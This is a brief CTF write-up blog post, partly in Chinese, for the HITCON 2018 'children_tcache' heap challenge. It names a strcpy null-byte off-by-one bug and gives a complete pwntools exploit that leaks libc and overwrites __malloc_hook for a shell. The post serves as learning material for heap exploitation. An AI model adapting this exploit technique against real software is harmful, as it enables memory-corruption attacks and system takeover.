---
title: 'Hitcon:children_tcache'
date: 2018-11-16 22:07:12
tags:
---
children..和baby是名字打错了吗/捂脸
<!--more-->
# Analysis
[附件][2]
baby_tcache的低级版...
[baby_tcache][1]
主要漏洞在strcpy存在null byte off
只要像babytcache一样构造直接show来leak就可以了...
主要思路在上题链接中这里不多赘述

# EXP
```python
from pwn import *
def cmd(c):
	p.sendlineafter("ice: ",str(c))
def add(size,data):
	cmd(1)
	p.sendlineafter("Size:",str(size))
	p.sendafter("Data:",data)
def show(idx):
	cmd(2)
	p.sendlineafter("Index:",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index:",str(idx))

p=process("./children_tcache")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
for x in range(6):
	add(0x80,"\n")
add(0x5e0,'\n')#6
add(0x500,'\n')#7
add(0x80,'\n')#8
free(6)


add(0x18,'B'*0x18)#6
add(0x80,'\n')#9

for x in range(6):
	free(x)


free(8)
free(6)
add(0x100,'\n')#0
free(9)
free(7)
add(0x350,'\n')#1
add(0x30,'\n')#2
add(0x40,'\n')#3
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dcfca0-0x7ffff79e4000)
libc.address=base
log.warning(hex(base))
add(0x100,'\n')
free(0)
free(4)
add(0x100,p64(libc.symbols['__malloc_hook']))
add(0x100,p64(libc.symbols['__malloc_hook']))
add(0x100,p64(0x10a38c+base))
cmd(1)
p.sendline("0")
p.sendline("clear")
p.interactive("nier>>>")
```




[1]:[https://n132.github.io/2018/11/15/Hitcone-baby-tcache/]
[2]:[1]:https://github.com/n132/Watermalon/tree/master/Hitcon_2018/children_tcache